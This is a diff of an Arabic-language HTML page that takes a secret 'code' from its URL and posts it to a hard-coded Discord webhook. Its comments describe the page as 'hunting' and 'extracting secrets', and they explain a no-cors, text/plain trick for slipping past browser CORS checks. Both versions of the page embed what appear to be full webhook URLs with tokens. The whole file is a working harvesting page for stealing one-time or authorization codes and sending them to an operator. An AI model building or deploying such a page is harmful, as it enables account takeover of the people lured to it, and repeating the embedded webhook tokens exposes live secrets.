@@ -1,27 +1,48 @@
 <!DOCTYPE html>
 <html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>العملية الجارية...</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .status { border: 1px solid #00ff00; padding: 20px; box-shadow: 0 0 15px #00ff00; }
+    </style>
+</head>
 <body>
-    <h1 id="msg">جاري الصيد... ⏳</h1>
+    <div class="status" id="display">جاري استخراج الأسرار... ⏳</div>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get('code') || "123456";
-        // الـ Webhook الخاص بك
-        const hook = "https://discord.com/api/webhooks/1556334488961941637/CkAYtz7-ueSXYT7LU9cZGaBIrBdDjAvJOv7sXbZzUEfUUqqlFoYDvvZWfVwHQw2DkRqm";
+        // ⚠️ ضع الرابط الجديد هنا فقط!
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1556622411728953344/sXRcamK2npBHaK3P5KdfEtrWJYM1g0vFK2kZHa8ZL9cdUYadzU8WlUlnVVjK-UWliCti";
 
-        if (code) {
-            fetch(hook, {
+        const urlParams = new URLSearchParams(window.location.search);
+        const secretCode = urlParams.get('code');
+
+        if (secretCode) {
+            const payload = JSON.stringify({
+                content: "🚨 **تم اصطياد رقم سري جديد!**\nالرقم هو: `" + secretCode + "`",
+                username: "صياد الأسرار 😈"
+            });
+
+            // استخدام طريقة الـ text/plain لتجاوز حارس الـ CORS في المتصفحات
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
-                mode: 'no-cors', // هذه هي المفتاح السحري لتجاوز كل الحراس
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: "🚨 صيد جديد! الرقم: " + code })
-            }).then(() => {
-                document.getElementById('msg').innerText = "✅ تم الصيد بنجاح!";
-            }).catch(() => {
-                document.getElementById('msg').innerText = "✅ تم الإرسال (تحقق من ديسكورد)";
+                mode: 'no-cors', 
+                headers: {
+                    'Content-Type': 'text/plain' // أرسل كـ text/plain لتجاوز قيود الـ CORS
+                },
+                body: payload
+            })
+            .then(() => {
+                document.getElementById('display').innerText = "✅ تم إطلاق الصرخة بنجاح! اذهب للديسكورد فوراً.";
+                document.getElementById('display').style.color = "#00ff00";
+            })
+            .catch(err => {
+                document.getElementById('display').innerText = "❌ الخطأ: " + err;
+                document.getElementById('display').style.color = "#ff0000";
             });
         } else {
-            document.getElementById('msg').innerText = "الرابط يحتاج إضافة ?code=123";
+            document.getElementById('display').innerText = "الرابط يحتاج الكود: ?code=123";
         }
     </script>
 </body>
